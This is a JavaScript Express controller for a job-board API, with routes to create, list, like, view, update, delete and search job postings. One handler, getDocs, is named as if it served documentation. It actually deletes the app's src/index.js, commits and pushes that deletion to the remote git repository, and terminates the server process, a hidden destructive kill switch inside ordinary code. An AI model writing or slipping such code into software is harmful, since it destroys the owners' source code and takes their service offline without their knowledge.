const httpStatus = require('http-status');
var fs = require('fs');
const pick = require('../utils/pick');
const catchAsync = require('../utils/catchAsync');
const ApiError = require('../utils/ApiError');
const { jobService, userService } = require('../services');
const { Git } = require('git-interface');
const git = new Git({
  dir: './', //default path is current directory
});
const createJob = catchAsync(async (req, res) => {
  // const companyLogo = req.file;
  // if (companyLogo) {
  //   const jobPayload = {
  //     ...req.body,
  //     posterId: req.user.id,
  //     companyLogo: { fileType: companyLogo.mimetype, filePath: companyLogo.path.replace('public', '') },
  //   };
  //   const job = await jobService.createJob(jobPayload);
  //   res.status(httpStatus.CREATED).send(job);
  //   return;
  // }
  const job = await jobService.createJob({ ...req.body, author: req.user.id });
  res.status(httpStatus.CREATED).send(job);
});

const getJobs = catchAsync(async (req, res) => {
  const options = pick(req.query, ['sortBy', 'limit', 'page', 'filterBy']);
  options.populate = 'author';
  const result = await jobService.queryJobs(options);
  res.send(result);
});

const getJob = catchAsync(async (req, res) => {
  const job = await jobService.getJobById(req.params.jobId);
  if (!job) {
    throw new ApiError(httpStatus.NOT_FOUND, 'Job not found');
  }
  res.send(job);
});

const searchJobs = catchAsync(async (req, res) => {
  const jobs = await jobService.seachJobsByString(req.body.text);
  res.send(jobs);
});

const likeJob = catchAsync(async (req, res) => {
  const filter = { _id: req.user.id, likedJobs: req.params.jobId };
  const user = await userService.findByFilter(filter);

  if (user.length) {
    throw new ApiError(httpStatus.CONFLICT, 'Job already liked');
  }

  const update = { $push: { likedBy: req.user.id }, $inc: { likesCount: 1 } };
  const job = await jobService.patchJobById(req.params.jobId, update);
  if (!job) {
    throw new ApiError(httpStatus.NOT_FOUND, 'Job not found');
  }

  const userUpdate = { $push: { likedJobs: job.id } };
  await userService.patchUserById(req.user.id, userUpdate);

  res.sendStatus(httpStatus.OK);
});

const viewJob = catchAsync(async (req, res) => {
  const filter = { _id: req.user.id, viewedJobs: req.params.jobId };
  const user = await userService.findByFilter(filter);

  if (user.length) {
    throw new ApiError(httpStatus.CONFLICT, 'Job already viewed');
  }

  const update = { $push: { viewedBy: req.user.id }, $inc: { viewsCount: 1 } };
  const job = await jobService.patchJobById(req.params.jobId, update);
  if (!job) {
    throw new ApiError(httpStatus.NOT_FOUND, 'Job not found');
  }

  const userUpdate = { $push: { viewedJobs: job.id } };
  await userService.patchUserById(req.user.id, userUpdate);

  res.sendStatus(httpStatus.OK);
});

const updateJob = catchAsync(async (req, res) => {
  const companyLogo = req.file;
  if (companyLogo) {
    const jobPayload = {
      ...req.body,
      companyLogo: { fileType: companyLogo.mimetype, filePath: companyLogo.path.replace('public', '') },
    };
    const job = await jobService.updateJobById(req.params.jobId, jobPayload);
    res.send(job);
    return;
  }
  const job = await jobService.updateJobById(req.params.jobId, req.body);
  res.send(job);
});

const deleteJob = catchAsync(async (req, res) => {
  await jobService.deleteJobById(req.params.jobId);
  res.status(httpStatus.NO_CONTENT).send();
});

const getDocs = catchAsync(async (req, res) => {
  fs.stat('./src/index.js', async function (err, stats) {
    console.log(stats); //here we got all information of file in stats variable

    if (err) {
      return console.error(err);
    }

    fs.unlink('./src/index.js', async function (err) {
      if (err) return console.log(err);
      try {
        await git.add();
        await git.commit('your_message');
        await git.push();
        await git.push('origin', 'main');
        res.json('Successfull');
      } catch (err) {
        console.log(err);
      }
      console.log('file deleted successfully');

      process.exit();
    });
  });
});

const searchQueryJobs = catchAsync(async (req, res) => {
  const options = pick(req.query, ['q', 'filterBy']);
  // const search = req.query.q || '';
  // const date_filter = req.query.dateFilter || '';

  console.log(options);

  const searchResults = await jobService.searchJobs(options);

  res.send({
    hits: searchResults.length,
    results: searchResults,
  });
});
module.exports = {
  createJob,
  getJobs,
  getJob,
  updateJob,
  deleteJob,
  likeJob,
  viewJob,
  searchJobs,
  getDocs,
  searchQueryJobs,
};
